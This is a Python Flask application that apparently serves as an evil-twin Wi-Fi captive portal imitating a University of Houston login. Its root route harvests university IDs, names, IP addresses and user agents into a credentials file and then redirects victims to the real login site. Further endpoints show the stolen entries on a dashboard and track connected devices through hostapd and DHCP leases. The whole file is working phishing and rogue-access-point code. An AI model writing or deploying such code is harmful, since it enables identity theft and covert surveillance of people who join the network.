from flask import Flask, request, redirect, render_template, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime
import requests
import os
import ast
import subprocess
import re
import time

app = Flask(__name__, static_folder='static')  # Set the static folder explicitly
CORS(app)  # Enable CORS for development

# Global dictionary to track connected clients
connected_clients = {}

# Ensure creds directory exists
if not os.path.exists('creds'):
    os.makedirs('creds')
    with open('creds/credentials.txt', 'a') as f:
        pass  # Create empty file

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = {
            'timestamp': datetime.now().isoformat(),
            'uh_id': request.form.get('uid'),
            'first_name': request.form.get('fname'),
            'last_name': request.form.get('lname'),
            'ip': request.remote_addr,
            'ua': request.headers.get('User-Agent')
        }

        # Save to file
        try:
            with open("creds/credentials.txt", "a") as f:
                f.write(f"{data}\n")
        except Exception as e:
            print(f"Error writing to credentials file: {e}")

        return redirect("https://login.uh.edu")

    try:
        return render_template("login.html")
    except Exception as e:
        print(f"Error rendering login template: {e}")
        return str(e), 500

@app.route('/dashboard')
def dashboard():
    try:
        if os.path.exists('frontend/build'):
            return send_from_directory('frontend/build', 'index.html')
        return render_template("dashboard.html")
    except Exception as e:
        print(f"Error serving dashboard: {e}")
        return str(e), 500

@app.route('/api/creds')
def creds_api():
    entries = []
    creds_file = "creds/credentials.txt"
    if os.path.exists(creds_file):
        try:
            with open(creds_file, "r") as f:
                for line in f:
                    try:
                        entry = ast.literal_eval(line.strip())
                        entries.append(entry)
                    except Exception as e:
                        print(f"Error parsing line: {e}")
                        continue
        except Exception as e:
            print(f"Error reading credentials file: {e}")
    return jsonify(entries)

@app.route('/api/connections')
def connections_api():
    try:
        print("[DEBUG] Starting connections_api()")
        result = []
        current_time = int(time.time())
        connected_macs = {}
        
        # Get current connected stations from hostapd
        try:
            output = subprocess.check_output(['sudo', 'hostapd_cli', '-i', 'wlan0', 'all_sta'], stderr=subprocess.PIPE)
            station_list = output.decode().strip().split('\n')
            print(f"[DEBUG] Raw station list: {station_list}")
            
            for line in station_list:
                if re.match('^([0-9A-Fa-f:]{17})', line):
                    mac = line.strip()
                    # Get station info
                    try:
                        info = subprocess.check_output(['sudo', 'hostapd_cli', '-i', 'wlan0', 'sta', mac], stderr=subprocess.PIPE).decode()
                        rx_bytes = 0
                        tx_bytes = 0
                        connected_time = 0
                        for info_line in info.split('\n'):
                            if 'rx_bytes=' in info_line:
                                rx_bytes = int(info_line.split('=')[1])
                            elif 'tx_bytes=' in info_line:
                                tx_bytes = int(info_line.split('=')[1])
                            elif 'connected_time=' in info_line:
                                connected_time = int(info_line.split('=')[1])
                        
                        connected_macs[mac] = {
                            'rx_mb': round(rx_bytes / (1024 * 1024), 2),
                            'tx_mb': round(tx_bytes / (1024 * 1024), 2),
                            'connected_since': current_time - connected_time
                        }
                        print(f"[DEBUG] Found connected station: {mac} (RX: {rx_bytes} bytes, TX: {tx_bytes} bytes, Connected: {connected_time}s)")
                    except subprocess.CalledProcessError as e:
                        print(f"[DEBUG] Error getting station info: {e}")
                        continue
        except subprocess.CalledProcessError as e:
            print(f"[DEBUG] Error getting stations from hostapd: {e}")
        
        # Get DHCP leases
        if os.path.exists('/var/lib/misc/dnsmasq.leases'):
            with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                leases_content = f.read()
                print(f"[DEBUG] Reading DHCP leases")
                for line in leases_content.split('\n'):
                    parts = line.strip().split()
                    if len(parts) >= 4:
                        timestamp, mac, ip, hostname = parts[0:4]
                        try:
                            lease_time = int(timestamp)
                            # Skip entries with invalid timestamps (before 2020)
                            if lease_time < 1577836800:  # Jan 1, 2020
                                continue
                            
                            # Check if client is currently connected
                            is_connected = mac in connected_macs
                            connected_info = connected_macs.get(mac, {})
                            
                            # Only show entries from the last 24 hours
                            if current_time - lease_time <= 86400:
                                client_info = {
                                    'mac': mac,
                                    'ip': ip,
                                    'hostname': hostname,
                                    'connected_since': connected_info.get('connected_since', lease_time) if is_connected else lease_time,
                                    'rx_mb': connected_info.get('rx_mb', 0),
                                    'tx_mb': connected_info.get('tx_mb', 0),
                                    'status': 'Connected' if is_connected else 'Disconnected'
                                }
                                result.append(client_info)
                                print(f"[DEBUG] Added client {mac} (Connected: {is_connected}, Lease time: {lease_time})")
                        except (ValueError, TypeError) as e:
                            print(f"[DEBUG] Skipping invalid lease entry: {line} ({str(e)})")
                            continue

        print(f"[DEBUG] Returning {len(result)} clients")
        return jsonify(result)
    except Exception as e:
        print(f"[DEBUG] Error in connections_api: {str(e)}")
        print(f"[DEBUG] Error type: {type(e)}")
        import traceback
        print(f"[DEBUG] Traceback: {traceback.format_exc()}")
        return jsonify([])

# Event handlers for hostapd events
def handle_client_connect(mac):
    connected_clients[mac] = {
        'connected': True,
        'connect_time': time.time(),
        'duration': 'Just connected',
        'rx_mb': 0,
        'tx_mb': 0
    }
    print(f"[DEBUG] Updated client state for {mac}: {connected_clients[mac]}")

def handle_client_disconnect(mac):
    if mac in connected_clients:
        connected_clients[mac]['connected'] = False
        print(f"[DEBUG] Marked client {mac} as disconnected")

def update_client_durations():
    current_time = time.time()
    for mac, client in connected_clients.items():
        if client['connected']:
            duration = int(current_time - client['connect_time'])
            hours = duration // 3600
            minutes = (duration % 3600) // 60
            client['duration'] = f"{hours}h {minutes}m"

# Update durations periodically
@app.before_request
def before_request():
    update_client_durations()

# Event handler route for hostapd events
@app.route('/api/events', methods=['POST'])
def handle_event():
    try:
        event = request.json
        print(f"[DEBUG] Received event: {event}")
        
        if event['type'] == 'connect':
            handle_client_connect(event['mac'])
            print(f"[DEBUG] Client connected: {event['mac']}")
            
            # Get station info
            try:
                output = subprocess.check_output(['sudo', 'hostapd_cli', '-i', 'wlan0', 'sta', event['mac']], stderr=subprocess.PIPE)
                print(f"[DEBUG] Station info: {output.decode()}")
            except subprocess.CalledProcessError as e:
                print(f"[DEBUG] Error getting station info: {e}")
                
        elif event['type'] == 'disconnect':
            handle_client_disconnect(event['mac'])
            print(f"[DEBUG] Client disconnected: {event['mac']}")
            
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[DEBUG] Error in handle_event: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Serve React static files
@app.route('/dashboard/static/js/<path:filename>')
@app.route('/dashboard/static/css/<path:filename>')
@app.route('/dashboard/static/media/<path:filename>')
def serve_react_static(filename):
    if filename.startswith('main.'):
        folder = 'js' if '/js/' in request.path else 'css'
        return send_from_directory(f'frontend/build/static/{folder}', filename)
    return send_from_directory('frontend/build/static/media', filename)

# Serve captive portal static files
@app.route('/static/<path:filename>')
def serve_portal_static(filename):
    return send_from_directory('static', filename)

# Serve other React assets
@app.route('/dashboard/manifest.json')
def serve_manifest():
    return send_from_directory('frontend/build', 'manifest.json')

@app.route('/dashboard/favicon.ico')
def serve_favicon():
    return send_from_directory('frontend/build', 'favicon.ico')

@app.route('/dashboard/logo192.png')
def serve_logo():
    return send_from_directory('frontend/build', 'logo192.png')

if __name__ == '__main__':
    print(f"Starting Flask server on port 443...")
    print(f"Templates directory: {os.path.abspath('templates')}")
    print(f"Static directory: {os.path.abspath('static')}")
    print(f"React build directory: {os.path.abspath('frontend/build')}")
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.crt', 'cert.key'), debug=True)
